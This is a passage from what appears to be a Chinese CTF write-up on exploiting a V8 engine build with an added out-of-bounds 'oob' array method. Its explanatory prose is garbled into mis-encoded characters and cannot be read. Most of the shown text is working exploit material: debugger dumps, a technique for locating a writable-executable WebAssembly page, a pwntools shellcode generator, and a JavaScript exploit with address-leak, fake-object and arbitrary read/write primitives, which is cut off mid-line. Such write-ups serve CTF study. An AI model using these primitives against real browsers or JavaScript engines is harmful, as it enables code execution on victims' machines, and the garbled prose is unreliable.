properties[0]</span><br><span class="line">    0x046dfe584f41 &lt;Symbol: Symbol.species&gt;: 0x08ad62ed0fd9 &lt;AccessorPair&gt; (const accessor descriptor)</span><br><span class="line">    #isArray: 0x08ad62ed1069 &lt;JSFunction isArray (sfi = 0x1bc536f86829)&gt; (const data field 1) properties[1]</span><br><span class="line">    #from: 0x08ad62ed10a1 &lt;JSFunction from (sfi = 0x1bc536f86879)&gt; (const data field 2) properties[2]</span><br><span class="line">    #of: 0x08ad62ed10d9 &lt;JSFunction of (sfi = 0x1bc536f868b1)&gt; (const data field 3) properties[3]</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>ç»§ç»­è·Ÿè¿›<code>constructor</code>å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªæˆå‘˜ä¸ºcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20xg 0x3eadb8bc6981-1</span><br><span class="line">0x3eadb8bc6980:0x0000046dfe580a310x0000046dfe582c01</span><br><span class="line">0x3eadb8bc6990:0x0000046dfe580c710x0000046dfe582791</span><br><span class="line">0x3eadb8bc69a0:0x00001bc536f916a90x800001c60000000d</span><br><span class="line">0x3eadb8bc69b0:0x000000240000001c0x000000a600000024</span><br><span class="line">0x3eadb8bc69c0:0x55a5afef9780ba490x000000e2ff410000</span><br><span class="line">0x3eadb8bc69d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x3eadb8bc69e0:0x0000046dfe580a310x0000046dfe582c01</span><br><span class="line">0x3eadb8bc69f0:0x0000046dfe580c710x0000046dfe582791</span><br><span class="line">0x3eadb8bc6a00:0x00001bc536f916c10x800001c60000000d</span><br><span class="line">0x3eadb8bc6a10:0x0000019f000001880x000000a70000019f</span><br></pre></td></tr></table></figure><p>åœ¨å†…éƒ¨å¯ä»¥çœ‹åˆ°åœ¨è·ç¦»å¼€å§‹ä½ç½®ä¸º0x40çš„ä½ç½®å°±èƒ½çœ‹åˆ°å¿ƒå¿ƒå¿µå¿µçš„ç¨‹åºåŸºåœ°å€ï¼Œæ‰€ä»¥ç›´æ¥é€šè¿‡è¿™é‡Œæ³„æ¼å³å¯ã€‚</p><p>æ³„æ¼å®ŒåŸºåœ°å€å°±å¾ˆå¥½åŠï¼Œåç»­å°±æ˜¯é€šè¿‡gotè¡¨æ³„æ¼libcåœ°å€ï¼Œç„¶ååŠ«æŒ<code>__free_hook</code>å³å¯ä¸º<code>system</code>ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªå‡½æ•°ä¸­ç”³è¯·å˜é‡ä¸ºæƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚</p><blockquote><p>  æˆ‘è¿™é‡Œæ²¡çœ‹è¿‡æºç ï¼Œä¸è¿‡æˆ‘çŒœæµ‹æ˜¯å› ä¸ºjsæ˜¯åŠ¨æ€å˜é‡çš„ç¼˜æ•…ï¼Œjsçš„å˜é‡éƒ½æ˜¯ä»¥å †çš„å½¢å¼å­˜åœ¨çš„ï¼Œå¹¶ä¸”åœ¨å‡½æ•°æ‰§è¡Œç»“æŸåä¼šé‡Šæ”¾æ‰å†…å­˜ã€‚</p></blockquote><h4 id="æœ€ç»ˆåˆ©ç”¨-éä¼ ç»Ÿæ–¹å¼"><a href="#æœ€ç»ˆåˆ©ç”¨-éä¼ ç»Ÿæ–¹å¼" class="headerlink" title="æœ€ç»ˆåˆ©ç”¨: éä¼ ç»Ÿæ–¹å¼"></a><strong>æœ€ç»ˆåˆ©ç”¨: éä¼ ç»Ÿæ–¹å¼</strong></h4><p>è¿™ç§æ–¹æ³•åˆ™æ˜¯å¾€ç¨‹åºä¸­å†™shellcodeï¼Œä½†æ˜¯ç¨‹åºè‡ªèº«å¹¶æ²¡æœ‰rwxçš„æ®µã€‚ä¸è¿‡å­˜åœ¨è¿™æ ·ä¸€ç§æŠ€æœ¯wasmï¼Œä½¿ç”¨ <a class="link"   href="https://wasdk.github.io/WasmFiddle" >è¿™ä¸ªç½‘ç«™<i class="fas fa-external-link-alt"></i></a> å¯ä»¥ç”Ÿæˆä¸€æ®µwasmç ï¼Œå¯ä»¥ç”¨ç”Ÿæˆä¸€ä¸ªå‡½æ•°å¯¹è±¡ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230627191416891.png"                      alt="image-20230627191416891"                ></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(f());</span><br><span class="line">% DebugPrint(f);</span><br><span class="line">% SystemBreak();</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230627191458616.png"                      alt="image-20230627191458616"                ></p><p>å½“æˆ‘ä»¬è¿è¡Œå¯ä»¥çœ‹åˆ°ç¡®å®æ˜¯è¿”å›äº†42ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x365390d5faf9</span><br><span class="line">0x365390d5faf9: [Function] in OldSpace</span><br><span class="line"> - map: 0x309e6c9c4379 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x365390d42109 &lt;JSFunction (sfi = 0x2a087603b29)&gt;</span><br><span class="line"> - elements: 0x2754f1600c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - function prototype: &lt;no-prototype-slot&gt;</span><br><span class="line"> - shared_info: 0x365390d5fac1 &lt;SharedFunctionInfo 0&gt;</span><br><span class="line"> - name: 0x2754f1604ae1 &lt;String[#1]: 0&gt;</span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - context: 0x365390d41869 &lt;NativeContext[246]&gt;</span><br><span class="line"> - code: 0x18b055a42001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - WASM instance 0x365390d5f901</span><br><span class="line"> - WASM function index 0</span><br><span class="line"> - properties: 0x2754f1600c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x02a0876004b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #name: 0x02a087600449 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #arguments: 0x02a087600369 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #caller: 0x02a0876003d9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ª f ï¼Œå¯ä»¥çœ‹åˆ°ä»–çš„ç±»å‹ä¸º<code>JSFunction</code>ï¼Œç»§ç»­è·Ÿè¿›å…¶ä¸­çš„<code>share_info</code>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x365390d5fac1</span><br><span class="line">0x365390d5fac1: [SharedFunctionInfo] in OldSpace</span><br><span class="line"> - map: 0x2754f16009e1 &lt;Map[56]&gt;</span><br><span class="line"> - name: 0x2754f1604ae1 &lt;String[#1]: 0&gt;</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - function_map_index: 144</span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - expected_nof_properties: 0</span><br><span class="line"> - language_mode: sloppy</span><br><span class="line"> - data: 0x365390d5fa99 &lt;WasmExportedFunctionData&gt;</span><br><span class="line"> - code (from data): 0x18b055a42001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - function token position: -1</span><br><span class="line"> - start position: -1</span><br><span class="line"> - end position: -1</span><br><span class="line"> - no debug info</span><br><span class="line"> - scope info: 0x2754f1600c61 &lt;ScopeInfo[0]&gt;</span><br><span class="line"> - length: 0</span><br><span class="line"> - feedback_metadata: 0x2754f1602a39: [FeedbackMetadata]</span><br><span class="line"> - map: 0x2754f1601319 &lt;Map&gt;</span><br><span class="line"> - slot_count: 0</span><br></pre></td></tr></table></figure><p>ç»§ç»­è·Ÿè¿›dataã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x365390d5fa99</span><br><span class="line">0x365390d5fa99: [WasmExportedFunctionData] in OldSpace</span><br><span class="line"> - map: 0x2754f1605879 &lt;Map[40]&gt;</span><br><span class="line"> - wrapper_code: 0x18b055a42001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - instance: 0x365390d5f901 &lt;Instance map = 0x309e6c9c9789&gt;</span><br><span class="line"> - function_index: 0</span><br></pre></td></tr></table></figure><p>è¿›ä¸€æ­¥æŸ¥çœ‹<code>instance</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x365390d5f901-1 20</span><br><span class="line">00:0000â”‚  0x365390d5f900 â€”â–¸ 0x309e6c9c9789 â—‚â€” 0x2500002754f16001</span><br><span class="line">01:0008â”‚  0x365390d5f908 â€”â–¸ 0x2754f1600c71 â—‚â€” 0x2754f16008</span><br><span class="line">02:0010â”‚  0x365390d5f910 â€”â–¸ 0x2754f1600c71 â—‚â€” 0x2754f16008</span><br><span class="line">03:0018â”‚  0x365390d5f918 â€”â–¸ 0x7fc28d7f0000 â—‚â€” 0x0</span><br><span class="line">04:0020â”‚  0x365390d5f920 â—‚â€” 0x10000</span><br><span class="line">05:0028â”‚  0x365390d5f928 â—‚â€” 0xffff</span><br><span class="line">06:0030â”‚  0x365390d5f930 â€”â–¸ 0x55ec1cb0d818 â€”â–¸ 0x7ffd93629d90 â—‚â€” 0x7ffd93629d90</span><br><span class="line">07:0038â”‚  0x365390d5f938 â€”â–¸ 0x2754f1600c71 â—‚â€” 0x2754f16008</span><br><span class="line">08:0040â”‚  0x365390d5f940 â€”â–¸ 0x55ec1cb931e0 â—‚â€” 0x0</span><br><span class="line">09:0048â”‚  0x365390d5f948 â€”â–¸ 0x2754f16004d1 â—‚â€” 0x2754f16005</span><br><span class="line">0a:0050â”‚  0x365390d5f950 â—‚â€” 0x0</span><br><span class="line">... â†“     3 skipped</span><br><span class="line">0e:0070â”‚  0x365390d5f970 â€”â–¸ 0x55ec1cb93200 â—‚â€” 0x0</span><br><span class="line">0f:0078â”‚  0x365390d5f978 â€”â–¸ 0x2754f16004d1 â—‚â€” 0x2754f16005</span><br><span class="line">10:0080â”‚  0x365390d5f980 â€”â–¸ 0x55ec1cb03b50 â€”â–¸ 0x2754f1600751 â—‚â€” 0xce00002754f16007</span><br><span class="line">11:0088â”‚  0x365390d5f988 â€”â–¸ 0x2ed8b8773000 â—‚â€” movabs r10, 0x2ed8b8773260 /* 0x2ed8b8773260ba49 */</span><br><span class="line">12:0090â”‚  0x365390d5f990 â€”â–¸ 0x9e8bdb4e4a1 â—‚â€” 0x710000309e6c9c91</span><br><span class="line">13:0098â”‚  0x365390d5f998 â€”â–¸ 0x9e8bdb4e711 â—‚â€” 0x710000309e6c9cad</span><br><span class="line">pwndbg&gt; vmmap 0x2ed8b8773000</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x2ed8b8773000     0x2ed8b8774000 rwxp     1000 0      [anon_2ed8b8773] +0x0</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åœ¨åç§»ä¸º<code>0x88</code>å¤„æœ‰rwxçš„æ®µäº†ã€‚æœ€åç›´æ¥å†™å…¥shellcodeå³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># https://www.xi4oyu.top/</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">just8</span>(<span class="params">data</span>):</span></span><br><span class="line">    size = <span class="built_in">len</span>(data)</span><br><span class="line">    real_size = size <span class="keyword">if</span> size % <span class="number">8</span> == <span class="number">0</span> <span class="keyword">else</span> size + (<span class="number">8</span> - size % <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> data.ljust(real_size, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_js</span>(<span class="params">data</span>):</span></span><br><span class="line">    ret = <span class="string">&#x27;var sc_arr = [&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> (i // <span class="number">8</span>) % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">            ret += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        x = u64(data[i:i+<span class="number">8</span>])</span><br><span class="line">        ret += <span class="string">&#x27;\t&#x27;</span> + <span class="built_in">hex</span>(x) + <span class="string">&#x27;n,&#x27;</span></span><br><span class="line">    ret += <span class="string">&#x27;\n]\n&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call_exec</span>(<span class="params">path, argv, envp</span>):</span></span><br><span class="line">    sc = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    sc += shellcraft.pushstr(path)</span><br><span class="line">    sc += shellcraft.mov(<span class="string">&#x27;rdi&#x27;</span>, <span class="string">&#x27;rsp&#x27;</span>)</span><br><span class="line">    sc += shellcraft.pushstr_array(<span class="string">&#x27;rsi&#x27;</span>, argv)</span><br><span class="line">    sc += shellcraft.pushstr_array(<span class="string">&#x27;rdx&#x27;</span>, envp)</span><br><span class="line">    sc += shellcraft.syscall(<span class="string">&#x27;SYS_execve&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">sc = <span class="string">&#x27;&#x27;</span></span><br><span class="line">sc = call_exec(<span class="string">&#x27;/usr/bin/xcalc&#x27;</span>, [<span class="string">&#x27;xcalc&#x27;</span>], [<span class="string">&#x27;DISPLAY=:0&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sc)</span><br><span class="line">data = asm(sc)</span><br><span class="line">data = just8(data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(to_js(data))</span><br></pre></td></tr></table></figure><p>ä¸Šé¢è¿™æ˜¯æˆ‘æŠ„çš„ç”¨äºç”Ÿæˆjsçš„shellcodeçš„pythonè„šæœ¬ï¼Œåœ¨å¼€å¤´ç•™æœ‰åŸä½œè€…é“¾æ¥ã€‚</p><h3 id="æœ€ç»ˆexp"><a href="#æœ€ç»ˆexp" class="headerlink" title="æœ€ç»ˆexp"></a>æœ€ç»ˆexp</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> uint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// @param &#123;float64&#125; float_num</span></span><br><span class="line"><span class="comment">// @return &#123;uint64&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">float_num</span>) </span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = float_num;</span><br><span class="line">    <span class="keyword">return</span> uint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// @param &#123;uint64&#125; uint64_num</span></span><br><span class="line"><span class="comment">// @return &#123;float64&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">uint64_num</span>) </span>&#123;</span><br><span class="line">    uint64[<span class="number">0</span>] = uint64_num;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123; <span class="string">&quot;a&quot;</span>: <span class="number">1</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> flt_array = [<span class="number">1.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();</span><br><span class="line"><span class="keyword">var</span> flt_array_map = flt_array.oob();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">address_of</span>(<span class="params">leak_obj</span>) </span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = leak_obj;</span><br><span class="line">    obj_array.oob(flt_array_map);</span><br><span class="line">    <span class="keyword">var</span> res = obj_array[<span class="number">0</span>];</span><br><span class="line">    obj_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">return</span> f2i(res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fake_object</span>(<span class="params">address</span>) </span>&#123;</span><br><span class="line">    flt_array[<span class="number">0</span>] = i2f(address);</span><br><span class="line">    flt_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">var</span> fake_obj = flt_array[<span class="number">0</span>];</span><br><span class="line">    flt_array.oob(flt_array_map);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arb_rw_arr = [flt_array_map, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>];</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;arb_rw_arr =&gt; 0x&quot;</span>, (address_of(arb_rw_arr) - <span class="number">0x20n</span>).toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> fake_obj = fake_object(address_of(arb_rw_arr) - <span class="number">0x20n</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbitrary_read</span>(<span class="params">address</span>) </span>&#123;</span><br><span class="line">    arb_rw_arr[<span class="number">2</span>] = i2f(address - <span class="number">0x10n</span> + <span class="number">0x1n</span>)</span><br><span class="line">    <span class="keyword">return</span> f2i(fake_obj[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = address_of(buffer) - <span class="number">1n</span> + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbitrary_write</span>(<span class="params">address, value</span>) </span>&#123;</span><br><span class="line">    arb_rw_arr[<span class="number">2</span>] = i2f(buf_backing_store_addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_obj[<span class="number">0</span>] = i2f(address);</span><br><span class="line">    data_view.setFloat64(<span class="number">0</span>, i2f(value), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> code_addr = 